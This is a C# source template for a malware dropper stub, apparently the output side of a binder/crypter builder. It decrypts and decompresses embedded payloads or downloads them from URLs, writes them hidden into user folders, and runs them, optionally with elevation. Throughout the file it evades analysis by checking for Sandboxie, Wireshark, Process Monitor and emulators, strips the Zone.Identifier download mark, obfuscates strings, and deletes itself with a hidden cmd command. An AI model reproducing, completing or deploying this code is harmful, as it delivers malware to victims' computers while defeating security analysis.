/*{PREPROCESSOR}*/

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
/*{ASSEMBLYINFO}*/
class __Program__
{
	static object[] __Items__ = new object[]
	{
/*{ITEMS}*/	};

	static void Main()
	{
#if ENABLE_DELETEZONEID
		try
		{
			__F_DeleteFile__(Assembly.GetExecutingAssembly().Location + /**/":Zone.Identifier");
		} catch { }
#endif

#if ENABLE_ANTI_SANDBOXIE
		bool isSandboxie = __F_GetModuleHandle__(/**/"SbieDll") != IntPtr.Zero;
#endif
#if ENABLE_ANTI_WIRESHARK
		bool isWireshark =
			Process.GetProcessesByName(/**/"Wireshark").Length > 0 ||
			Process
				.GetProcesses()
				.Any(process =>
				{
					try
					{
						return string.Compare(process.MainWindowTitle, /**/"The Wireshark Network Analyzer", true) == 0;
					}
					catch
					{
						return false;
					}
				});
#endif
#if ENABLE_ANTI_PROCESSMONITOR
		bool isProcessMonitor = Process
			.GetProcesses()
			.Any(process =>
			{
				try
				{
					return process.MainWindowTitle.ToLower().Contains(/**/"process monitor -");
				}
				catch
				{
					return false;
				}
			});
#endif
#if ENABLE_ANTI_EMULATOR
		int start = Environment.TickCount;
		DateTime startTime = DateTime.Now;
		Thread.Sleep(500);
		int stop = Environment.TickCount;
		DateTime stopTime = DateTime.Now;
		bool isEmulator = stop - start < 450 || stopTime - startTime < TimeSpan.FromMilliseconds(450);
#endif

		foreach (object item in __Items__)
		{
			try
			{
				if (item is __FileItem__)
				{
					__FileItem__ file = (__FileItem__)item;
#if ENABLE_ANTI_SANDBOXIE
					if (file.__C1_AntiSandboxie__ && isSandboxie) continue;
#endif
#if ENABLE_ANTI_WIRESHARK
					if (file.__C1_AntiWireshark__ && isWireshark) continue;
#endif
#if ENABLE_ANTI_PROCESSMONITOR
					if (file.__C1_AntiProcessMonitor__ && isProcessMonitor) continue;
#endif
#if ENABLE_ANTI_EMULATOR
					if (file.__C1_AntiEmulator__ && isEmulator) continue;
#endif

					byte[] data = file.__C1_Content__;
#if ENABLE_ENCRYPTION
					if (file.__C1_Encrypt__) data = __F_Decrypt__(data);
#endif
#if ENABLE_COMPRESSION
					if (file.__C1_Compress__) data = __F_Decompress__(data);
#endif

					__F_Drop__
					(
						file.__C1_FileName__,
						file.__C1_Hidden__,
						file.__C1_DropLocation__,
						file.__C1_DropAction__,
						file.__C1_Runas__,
						file.__C1_CommandLine__,
						data
					);
				}
				else if (item is __UrlItem__)
				{
					__UrlItem__ url = (__UrlItem__)item;
#if ENABLE_ANTI_SANDBOXIE
					if (url.__C2_AntiSandboxie__ && isSandboxie) continue;
#endif
#if ENABLE_ANTI_WIRESHARK
					if (url.__C2_AntiWireshark__ && isWireshark) continue;
#endif
#if ENABLE_ANTI_PROCESSMONITOR
					if (url.__C2_AntiProcessMonitor__ && isProcessMonitor) continue;
#endif
#if ENABLE_ANTI_EMULATOR
					if (url.__C2_AntiEmulator__ && isEmulator) continue;
#endif

					__F_Drop__
					(
						url.__C2_FileName__,
						url.__C2_Hidden__,
						url.__C2_DropLocation__,
						url.__C2_DropAction__,
						url.__C2_Runas__,
						url.__C2_CommandLine__,
						new WebClient().DownloadData(url.__C2_Url__)
					);
				}
				else if (item is __MessageBoxItem__)
				{
					__MessageBoxItem__ messageBox = (__MessageBoxItem__)item;
					MessageBox.Show(messageBox.__C3_Text__, messageBox.__C3_Title__, messageBox.__C3_Buttons__, messageBox.__C3_Icon__);
				}
			}
			catch { }
		}

#if ENABLE_MELT
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = /**/"cmd.exe",
				Arguments =
					/**/"/C ping 1.1.1.1 -n 1 -w 100 > Nul & Del " +
					'\x22' + Environment.GetCommandLineArgs()[0] + '\x22' +
					/**/"& ping 1.1.1.1 -n 1 -w 900 > Nul & Del " +
					'\x22' + Environment.GetCommandLineArgs()[0] + '\x22',
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
		} catch { }
#endif
	}

	static void __F_Drop__(string __f1_name__, bool __f1_hidden__, int __f1_dropLocation__, int __f1_dropAction__, bool __f1_runas__, string __f1_commandLine__, byte[] __f1_data__)
	{
		string path;
		switch (__f1_dropLocation__)
		{
			case 1:
				path = Path.GetTempPath();
				break;
			case 2:
				path = Registry.GetValue(/**/"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", /**/"{374DE290-123F-4565-9164-39C4925E467B}", null) as string;
				break;
			case 3:
				path = Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory);
				break;
			case 4:
				path = Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments);
				break;
			case 5:
				path = AppDomain.CurrentDomain.BaseDirectory;
				break;
			default:
				return;
		}

		__f1_name__ = Path.Combine(path, __f1_name__);

		File.Delete(__f1_name__);
		File.WriteAllBytes(__f1_name__, __f1_data__);
		if (__f1_hidden__) new FileInfo(__f1_name__).Attributes |= (FileAttributes)6;

		if (__f1_dropAction__ >= 1)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(__f1_name__, __f1_commandLine__);
			if (__f1_runas__) processStartInfo.Verb = /**/"runas";

			Process process = null;
			try
			{
				process = Process.Start(processStartInfo);
			}
			catch { }

			if (__f1_dropAction__ >= 2)
			{
				if (process != null) process.WaitForExit();
				if (__f1_dropAction__ >= 3) File.Delete(__f1_name__);
			}
		}
	}

#if ENABLE_COMPRESSION
	static byte[] __F_Decompress__(byte[] __f2_data__)
	{
		MemoryStream memoryStream = new MemoryStream();
		int length = BitConverter.ToInt32(__f2_data__, 0);
		memoryStream.Write(__f2_data__, 4, __f2_data__.Length - 4);
		byte[] decompressedData = new byte[length];
		memoryStream.Position = 0;
		new GZipStream(memoryStream, (CompressionMode)0).Read(decompressedData, 0, decompressedData.Length);
		return decompressedData;
	}
#endif
#if ENABLE_ENCRYPTION
	static byte[] __F_Decrypt__(byte[] __f3_data__)
	{
		byte[] key = new byte[16];
		Buffer.BlockCopy(__f3_data__, 0, key, 0, 16);
		Rijndael aes = Rijndael.Create();
		aes.IV = aes.Key = key;
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), (CryptoStreamMode)1);
		cryptoStream.Write(__f3_data__, 16, __f3_data__.Length - 16);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}
#endif
#if ENABLE_STRINGENCRYPTION || ENABLE_STRINGLITERALENCRYPTION
	static string __F_DecryptString__(string __f4_str__)
	{
		return new string(__f4_str__.Substring(1).Select(c => (char)(c ^ (byte)__f4_str__[0])).ToArray());
	}
#endif

#if ENABLE_DELETEZONEID
	[DllImport("kernel32.dll", EntryPoint = "DeleteFile", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool __F_DeleteFile__(string __f10_name__);
#endif
#if ENABLE_ANTI_SANDBOXIE
	[DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", SetLastError = true)]
	static extern IntPtr __F_GetModuleHandle__(string __f11__moduleName__);
#endif
}

class __FileItem__
{
	public string __C1_FileName__;
	public bool __C1_Compress__;
	public bool __C1_Encrypt__;
	public bool __C1_Hidden__;
	public int __C1_DropLocation__;
	public int __C1_DropAction__;
	public bool __C1_Runas__;
	public string __C1_CommandLine__;
	public bool __C1_AntiSandboxie__;
	public bool __C1_AntiWireshark__;
	public bool __C1_AntiProcessMonitor__;
	public bool __C1_AntiEmulator__;
	public byte[] __C1_Content__;
}

class __UrlItem__
{
	public string __C2_Url__;
	public string __C2_FileName__;
	public bool __C2_Hidden__;
	public int __C2_DropLocation__;
	public int __C2_DropAction__;
	public bool __C2_Runas__;
	public string __C2_CommandLine__;
	public bool __C2_AntiSandboxie__;
	public bool __C2_AntiWireshark__;
	public bool __C2_AntiProcessMonitor__;
	public bool __C2_AntiEmulator__;
}

class __MessageBoxItem__
{
	public string __C3_Title__;
	public string __C3_Text__;
	public MessageBoxButtons __C3_Buttons__;
	public MessageBoxIcon __C3_Icon__;
}